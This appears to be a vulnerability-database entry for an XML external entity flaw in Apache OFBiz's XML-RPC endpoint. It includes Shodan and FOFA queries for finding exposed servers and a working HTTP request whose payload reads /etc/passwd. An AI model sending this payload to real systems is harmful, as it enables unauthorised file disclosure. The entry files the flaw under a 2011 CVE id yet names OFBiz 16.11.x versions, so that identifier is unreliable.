---
layout: post
cve_id: CVE-2011-3600
title: Apache OFBiz - XML External Entity Injection
pcap: true
pcap_path: /pcaps/2011/CVE-2011-3600.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2011/CVE-2011-3600.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo,pikpikcu
severity: high
impact: 'Attackers can disclose sensitive filesystem data, probe network ports, and
  determine file existence, leading to information disclosure and potential further
  exploitation.

  '
remediation: 'Update to the latest OFBiz version or apply security patches addressing
  XML external entity vulnerabilities.

  '
reference:
- https://lists.apache.org/thread/cwz2v0b6pnxvqrnsd0hj3l80g9qq5kd8
- https://nvd.nist.gov/vuln/detail/CVE-2011-3600
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2011-3600
  cwe-id: CWE-611
  epss-score: 0.37264
  epss-percentile: 0.97035
  cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: apache
  product: ofbiz
  shodan-query:
  - http.html:"ofbiz"
  - ofbiz.visitor=
  fofa-query:
  - body="ofbiz"
  - app="apache_ofbiz"
tags:
- cve
- cve2011
- apache
- ofbiz
- xxe
- vuln
- vkev
---

## üîç Vulnerability Description
The /webtools/control/xmlrpc endpoint in OFBiz XML-RPC event handler is exposed to External Entity Injection by passing DOCTYPE declarations with executable payloads that discloses the contents of files in the filesystem. In addition, it can also be used to probe for open network ports, and figure out from returned error messages whether a file exists or not. This affects OFBiz 16.11.01 to 16.11.04.


## üåê HTTP Request
```nohighlight
POST /webtools/control/xmlrpc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Connection: close
Content-Length: 143
Content-Type: application/xml
Accept-Encoding: gzip

<?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file:////etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>
```

